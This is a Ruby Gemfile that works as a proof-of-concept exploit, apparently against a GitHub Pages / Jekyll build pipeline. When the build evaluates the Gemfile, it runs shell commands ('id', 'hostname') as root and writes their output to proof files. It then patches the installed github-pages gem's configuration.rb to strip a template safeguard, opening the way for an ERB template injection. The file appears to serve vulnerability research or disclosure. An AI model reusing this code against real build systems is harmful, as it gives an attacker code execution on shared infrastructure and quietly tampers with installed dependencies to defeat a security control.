# Gemfile - executed by bundle check --dry-run via instance_eval
# This runs BEFORE Jekyll safe mode, as root

proof = []
proof << "GEMFILE_RCE=true"
proof << "TIME=#{Time.now}"
proof << "ID=#{`id 2>&1`.strip}"
proof << "HOSTNAME=#{`hostname 2>&1`.strip}"
proof << "PWD=#{Dir.pwd}"
proof << "RUBY=#{RUBY_VERSION}"

# Write proof to workspace (Jekyll will copy .txt files to _site)
File.write('/github/workspace/gemfile-rce-proof.txt', proof.join("\n") + "\n") rescue nil

# Also patch the github-pages gem to remove template OVERRIDE
# This enables the {::options template="string://ERB" /} attack
config_files = Dir.glob('/usr/local/bundle/gems/github-pages-*/lib/github-pages/configuration.rb')
config_files.each do |cf|
  content = File.read(cf)
  # Remove the template override so {::options template=...} works
  patched = content.gsub('"template" => "",', '"template" => nil,')
  File.write(cf, patched)
  File.write('/github/workspace/gemfile-patch-proof.txt', "PATCHED=#{cf}\n") rescue nil
end

source "https://rubygems.org"
gem "github-pages", "~> 232", group: :jekyll_plugins
